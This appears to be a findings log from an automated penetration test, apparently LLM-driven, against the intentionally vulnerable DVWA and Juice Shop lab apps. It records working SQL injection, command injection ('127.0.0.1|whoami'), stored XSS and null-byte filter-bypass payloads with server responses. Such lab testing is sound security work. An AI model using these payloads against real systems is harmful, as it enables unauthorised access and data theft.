state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

GET form observed with dvwa_admin; page body reports 'Security Level: high' (session_info metadata reported 'low' - metadata mismatch noted). Form: action=/vulnerabilities/exec/, method=POST, fields ip (text, no maxlength), Submit (submit 'Submit'). Page heading 'Vulnerability: Command Injection'.

Candidate for medium-level instance of Stored XSS: same route and form schema as high pass; medium-specific filtering NOT observed (level not switched during mapping). Verify by setting security=medium via /security.php before testing.
Observed security-level form. user_token value observed on this page: 04204fd482b803280235c12196eb2833. Current level: low.
JSON body {email, password}. Invalid credentials return 401 'Invalid email or password.' Auth-bypass candidate (email field) not tested per mapping scope.
GET /rest/products/search?q=apple returns 200 JSON {status, data:[{id,name,description,price,deluxePrice,image,...}]}. Returns 9 columns per product record. Injection not tested per mapping scope.

Author emails are PARTIALLY masked in comments (e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)'); anonymous entries have UserId null. Partial PII exposure; full email not returned in this sample.

With Accept: text/html,application/json, returns 200 directory listing. Files: acquisitions.md (909 B), announcement_encrypted.md, coupons_2013.md.bak (131 B), eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak (4291 B), suspicious_errors.yml, quarantine/ subdirectory.

[security=medium] GET /vulnerabilities/sqli/ page shows form action=/vulnerabilities/sqli/ method=POST with fields id (text) and Submit=Submit; page text 'Security level set to medium'. Form is POST at medium (low used GET ?id=). Note: POST /security.php returned 302 and session_info still reported low, but page confirmed medium.

[security=high] GET /vulnerabilities/sqli/session-input.php returns 200 with form action=/vulnerabilities/sqli/session-input.php method=POST, fields id (text) and Submit=Submit; page title 'SQL Injection Session Input'. Value is stored in session and consumed by /vulnerabilities/sqli/.

findings.title: [security=high] SQL Injection via server-side session id (session-input.php -> /vulnerabilities/sqli/)
request_sequence: POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302 to /security.php (level then reads high)
GET http://dvwa/security.php -> 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # on /vulnerabilities/sqli/ returned HTTP 200 with 5 records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload 1' AND '1'='2' # returned HTTP 200 with ZERO records (page shows only 'Click here to change your ID' and More Information; no 'First name/Surname' rows). Page footer confirms 'Security Level: high'. Behavioral differential (5 seeded surnames vs 0) confirms SQL injection through the session-stored id at high security. Note: the session_info field in tool output lagged and still displayed 'low'; the security.php page itself displayed 'Security level set to high' and 'Security Level: high' in the footer.

findings.title: [security=high] OS Command Injection via ip parameter using pipe without space (DVWA Command Injection)
findings.response_evidence: [security=high] HTTP 200 from POST /vulnerabilities/exec/ with ip='127.0.0.1|whoami' (no space after pipe). Response body 'Ping a device ... Enter an IP address: www-data More Information'. Page reports 'Security Level: high'.

findings.title: Stored XSS in DVWA Guestbook message field [security=low]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> security_level reported: low, user_token=[REDACTED]

POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form: txtName=tester, mtxMessage=<script id="test_token">window.xss_flag=1</script> (50 chars), btnSign=Sign Guestbook -> HTTP 200, entry 'Name: tester' stored
findings.response_evidence: [security=low] Security level confirmed as 'low' on /security.php before testing (no level change was needed). The POST response stored the entry with Name 'tester' and an empty visible Message, consistent with the injected <script> element being parsed as markup rather than displayed as text. Loading /vulnerabilities/xss_s/ in an authenticated browser session and evaluating window.xss_flag returned "1" (script executed from the stored message). Note: medium and high were NOT tested in this verification.

findings.title: Login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user admin@juice-sh.op without valid credentials.

findings.title: Product search SQL injection (error-based and UNION-based)
findings.response_evidence: Quote payload: HTTP 500 text/html, body contains 'Error: SQLITE_ERROR: near "'%'": syntax error'. Baseline q=apple: HTTP 200 JSON {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]} with no error. UNION payload: HTTP 200 JSON {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The injected literals 2-9 appear in the product fields, so the UNION query executed.

findings.title: Unauthenticated user-feedback listing exposes author identity only in masked form (PII not confirmed)
request_sequence: GET http://juiceshop:3000/api/Feedbacks (unauth, Accept: application/json) -> HTTP 200, 8 records, no auth required
findings.response_evidence: Unauthenticated request returned HTTP 200 with 8 feedback records (fields UserId, id, comment, rating, createdAt, updatedAt; no email field). Author attribution appears only as masked text inside the comment: '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'; the remaining four records show '(anonymous)' with UserId null. No record discloses a full, unmasked email address, so CWE-359 full-PII exposure is not demonstrated. Partial masking leaks the domain and a partial local part only; this is recorded as a rejection of the full-PII claim.

findings.title: Open directory listing of /ftp/ exposes confidential acquisitions.md memo
findings.response_evidence: Listing: HTTP 200 text/html, 'listing directory /ftp/' with entries including 'acquisitions.md 909' and 'package.json.bak 4291'. Retrieval: HTTP 200 text/markdown, body: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: Browsable /encryptionkeys/ directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200 text/html, 'listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 ... premium.key 50 ...'. Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key present in listing, unauthenticated.

findings.title: Cross-user basket access: juiceshop_acct2 retrieves acct1 basket 6 contents
request_sequence: GET http://juiceshop:3000/rest/basket/6  (session juiceshop_acct1; session_info.own_basket_id=6, email acct1_bench@juiceshop.local)
GET http://juiceshop:3000/rest/basket/6  (session juiceshop_acct2; session_info.own_basket_id=7, email acct2_bench@juiceshop.local)
findings.response_evidence: Acct1 own basket 6: HTTP 200, UserId 22, Products: [{name: 'Apple Juice (1000ml)', BasketItem quantity: 3}]. Acct2 (own basket 7) request for /rest/basket/6: HTTP 200 status 'success', returns same basket UserId 22, product 'Apple Juice (1000ml)' with BasketItem quantity 3 belonging to Account 1, not Account 2's own basket.

findings.title: Poison null-byte bypass of /ftp/ file-extension filter exposes package.json.bak
findings.response_evidence: Raw path: HTTP 403, body 'Error: Only .md and .pdf files are allowed!' (fileServer.js verify). Null-byte bypass: HTTP 200, content-type application/octet-stream, body begins with '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", ... "dependencies": { "body-parser": "~1.18", ... "sequelize": "~4", "sqlite3": "~3.1.13" ...'. The restricted .bak file is served via the %2500 null-byte + .md suffix bypass.

findings.title: dvwa /security.php: CWE-639 candidate rejected; endpoint only sets DVWA security level (no object-reference flaw)
request_sequence: POST http://dvwa/security.php (dvwa_admin) form: security=medium, seclev_submit=Submit, user_token=[REDACTED] -> 302 to /security.php
findings.response_evidence: Behavioral check only. The endpoint is a server-side security-level control, not an object reference: it takes no record identifier and acts on the session's own DVWA security setting. POST with security=medium returned 302 to /security.php; the follow-up GET returned 200 with 'Security level is currently: medium' and 'Security level set to medium', confirming the level change. No cross-user or object-authorization flaw was demonstrated, so CWE-639 is rejected. Note: the observed user_token (04204fd4...) from the mapping pass was stale; the fresh token (15aed7a7...) was needed. Security is now left at medium for the next step (medium-level SQLi/exec verification).

findings.title: [security=medium] DVWA SQL Injection (numeric boolean) via POST id on /vulnerabilities/sqli/
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token c9115f77752e2b69a1e10757f76b3c24, level shown 'high'
POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET /security.php then shows 'Security level is currently: medium' and 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' returned 5 records: ID 1 OR 1=1 -> First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id='1 AND 1=2' returned zero records (only the 'User ID: 1 2 3 4 5' header, no 'ID:' / 'Surname:' rows). Page footer 'Security Level: medium'. Note: tool session_info still reported 'low' but the page content confirmed medium.

findings.title: [security=high] Session-input sink for SQL injection (id stored in session, consumed by /vulnerabilities/sqli/)
findings.response_evidence: [security=high] session-input.php accepted the TRUE payload (echoed 'Session ID: 1' OR '1'='1' #'), and the subsequent GET /vulnerabilities/sqli/ returned 5 seeded users (admin/Brown/Me/Picasso/Smith). Accepting the FALSE payload 1' AND '1'='2' # and reloading /vulnerabilities/sqli/ returned zero records. The session-stored value is injected into the query on the consumer page, as shown by the TRUE/FALSE differential. Same underlying finding as dvwa:GET:/vulnerabilities/sqli/.
